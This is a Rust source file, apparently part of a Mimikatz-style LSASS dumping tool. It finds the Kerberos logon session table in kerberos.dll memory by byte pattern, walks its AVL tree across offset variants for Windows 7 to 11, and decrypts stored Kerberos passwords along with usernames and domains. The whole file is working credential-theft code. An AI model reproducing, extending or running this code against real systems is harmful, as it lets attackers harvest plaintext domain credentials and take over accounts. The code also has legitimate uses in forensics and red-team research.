use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::KerberosCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// Kerberos session offsets per Windows version (x64).
/// KerbGlobalLogonSessionTable is an RTL_AVL_TABLE (since Vista).
/// Each AVL tree node has RTL_BALANCED_LINKS (0x20 bytes) header,
/// followed by the session entry data.
struct KerbOffsets {
    avl_node_data_offset: u64,
    luid: u64,
    credentials_ptr: u64,
    /// Password offset within KIWI_KERBEROS_PRIMARY_CREDENTIAL
    cred_password: u64,
}

/// Multiple offset variants for different Windows versions.
const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
    // Win10 1607+ / Win11: KIWI_KERBEROS_LOGON_SESSION_10_1607
    // Password at +0x30 in cred (extra unk0+padding before Password)
    KerbOffsets { avl_node_data_offset: 0x20, luid: 0x48, credentials_ptr: 0x88, cred_password: 0x30 },
    // Win10 1507-1511: KIWI_KERBEROS_LOGON_SESSION_10_1507
    // Password at +0x28 in cred (no extra padding)
    KerbOffsets { avl_node_data_offset: 0x20, luid: 0x48, credentials_ptr: 0x88, cred_password: 0x28 },
    // Win8/8.1: KIWI_KERBEROS_LOGON_SESSION_10
    KerbOffsets { avl_node_data_offset: 0x20, luid: 0x40, credentials_ptr: 0x80, cred_password: 0x28 },
    // Win7: KIWI_KERBEROS_LOGON_SESSION
    KerbOffsets { avl_node_data_offset: 0x20, luid: 0x18, credentials_ptr: 0x50, cred_password: 0x28 },
];

/// Extract Kerberos credentials from kerberos.dll.
pub fn extract_kerberos_credentials(
    vmem: &impl VirtualMemory,
    kerberos_base: u64,
    _kerberos_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, KerberosCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, kerberos_base)?;
    let mut results = Vec::new();

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Ok(results),
    };

    let text_base = kerberos_base + text.virtual_address as u64;

    let (pattern_addr, _) = match patterns::find_pattern(
        vmem,
        text_base,
        text.virtual_size,
        patterns::KERBEROS_LOGON_SESSION_PATTERNS,
        "KerbGlobalLogonSessionTable",
    ) {
        Ok(r) => r,
        Err(e) => {
            log::info!("Could not find Kerberos pattern: {}", e);
            return Ok(results);
        }
    };

    // The pattern "48 8B 18 48 8D 0D" ends with LEA RCX, [rip+disp]
    // The RIP-relative disp is at pattern_addr + 6 (after the 6-byte pattern)
    let table_addr = patterns::resolve_rip_relative(vmem, pattern_addr, 6)?;
    log::info!("Kerberos session table (RTL_AVL_TABLE) at 0x{:x}", table_addr);

    // RTL_AVL_TABLE layout (x64):
    //   +0x00: BalancedRoot.Parent (PVOID)
    //   +0x08: BalancedRoot.LeftChild (PVOID)
    //   +0x10: BalancedRoot.RightChild (PVOID) -- root of the actual AVL tree
    //   +0x18: BalancedRoot.Balance (CHAR + 7 pad)
    //   +0x20: OrderedPointer (PVOID)
    //   +0x28: WhichOrderedElement (ULONG)
    //   +0x2C: NumberGenericTableElements (ULONG)

    // Read all RTL_AVL_TABLE fields for diagnostics
    let parent = vmem.read_virt_u64(table_addr).unwrap_or(0);
    let left_child = vmem.read_virt_u64(table_addr + 0x08).unwrap_or(0);
    let right_child = vmem.read_virt_u64(table_addr + 0x10).unwrap_or(0);
    let num_elements = vmem.read_virt_u32(table_addr + 0x2C).unwrap_or(0);

    log::info!(
        "Kerberos AVL table: elements={}, Parent=0x{:x}, Left=0x{:x}, Right=0x{:x}",
        num_elements, parent, left_child, right_child
    );

    // The root of the AVL tree is BalancedRoot.RightChild
    let root_node = right_child;

    if (root_node == 0 || root_node == table_addr)
        && (left_child == 0 || left_child == table_addr) {
            return Ok(results);
        }

    // Walk the AVL tree to collect all node pointers
    let mut nodes = Vec::new();
    walk_avl_tree(vmem, root_node, table_addr, &mut nodes, 0);
    log::info!("Kerberos AVL tree: found {} nodes", nodes.len());

    // Auto-detect offset variant by probing first non-empty node
    let offsets = detect_kerb_offsets(vmem, &nodes);

    for node_ptr in &nodes {
        let entry = node_ptr + offsets.avl_node_data_offset;
        let luid = vmem.read_virt_u64(entry + offsets.luid).unwrap_or(0);
        let cred_ptr = vmem.read_virt_u64(entry + offsets.credentials_ptr).unwrap_or(0);

        if cred_ptr == 0 || luid == 0 {
            log::debug!(
                "Kerberos AVL node 0x{:x}: luid=0x{:x} cred_ptr=0x{:x} (skipped)",
                node_ptr, luid, cred_ptr
            );
            continue;
        }

        let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
        let domain = vmem.read_win_unicode_string(cred_ptr + 0x10).unwrap_or_default();

        if username.is_empty() {
            log::debug!(
                "Kerberos AVL node 0x{:x}: luid=0x{:x} cred_ptr=0x{:x} empty username (paged?)",
                node_ptr, luid, cred_ptr
            );
            continue;
        }

        let password = extract_kerb_password(vmem, cred_ptr, offsets.cred_password, keys)
            .unwrap_or_default();

        log::info!(
            "Kerberos: LUID=0x{:x} user={} domain={} password_len={}",
            luid, username, domain, password.len()
        );

        // Include credentials even without a password (username+domain is valuable)
        results.push((
            luid,
            KerberosCredential {
                username: username.clone(),
                domain: domain.clone(),
                password,
            },
        ));
    }

    Ok(results)
}

/// Walk an AVL tree (in-order traversal) collecting all node pointers.
/// Each node starts with RTL_BALANCED_LINKS:
///   +0x00: Parent (PVOID)
///   +0x08: LeftChild (PVOID)
///   +0x10: RightChild (PVOID)
///   +0x18: Balance (CHAR + 7 pad)
fn walk_avl_tree(
    vmem: &impl VirtualMemory,
    node: u64,
    sentinel: u64,
    results: &mut Vec<u64>,
    depth: usize,
) {
    if depth > 30 || node == 0 || node == sentinel || results.len() > 256 {
        return;
    }

    // Avoid revisiting (e.g., corrupted tree with cycles)
    if results.contains(&node) {
        return;
    }

    let left = vmem.read_virt_u64(node + 0x08).unwrap_or(0);
    let right = vmem.read_virt_u64(node + 0x10).unwrap_or(0);

    // In-order: left, current, right
    walk_avl_tree(vmem, left, sentinel, results, depth + 1);
    results.push(node);
    walk_avl_tree(vmem, right, sentinel, results, depth + 1);
}

/// Auto-detect Kerberos offset variant by probing AVL tree nodes.
fn detect_kerb_offsets(vmem: &impl VirtualMemory, nodes: &[u64]) -> &'static KerbOffsets {
    for node_ptr in nodes {
        for variant in KERB_OFFSET_VARIANTS {
            let entry = node_ptr + variant.avl_node_data_offset;
            let luid = match vmem.read_virt_u64(entry + variant.luid) {
                Ok(l) => l,
                Err(_) => continue,
            };
            if luid == 0 || luid > 0xFFFFFFFF {
                continue;
            }
            let cred_ptr = match vmem.read_virt_u64(entry + variant.credentials_ptr) {
                Ok(p) => p,
                Err(_) => continue,
            };
            if cred_ptr < 0x10000 || (cred_ptr >> 48) != 0 {
                continue;
            }
            // Try reading username from credential structure
            let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
            if !username.is_empty() && username.len() < 256 {
                log::debug!("Kerberos: auto-detected offsets luid=0x{:x} cred=0x{:x} pwd=0x{:x}",
                    variant.luid, variant.credentials_ptr, variant.cred_password);
                return variant;
            }
        }
    }
    &KERB_OFFSET_VARIANTS[0]
}

pub fn extract_kerb_password(
    vmem: &impl VirtualMemory,
    cred_ptr: u64,
    password_offset: u64,
    keys: &CryptoKeys,
) -> Result<String> {
    let pwd_len = vmem.read_virt_u16(cred_ptr + password_offset)? as usize;
    let pwd_ptr = vmem.read_virt_u64(cred_ptr + password_offset + 8)?;

    if pwd_len == 0 || pwd_ptr == 0 {
        return Ok(String::new());
    }

    let enc_data = vmem.read_virt_bytes(pwd_ptr, pwd_len)?;
    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
    Ok(crate::lsass::crypto::decode_utf16_le(&decrypted))
}
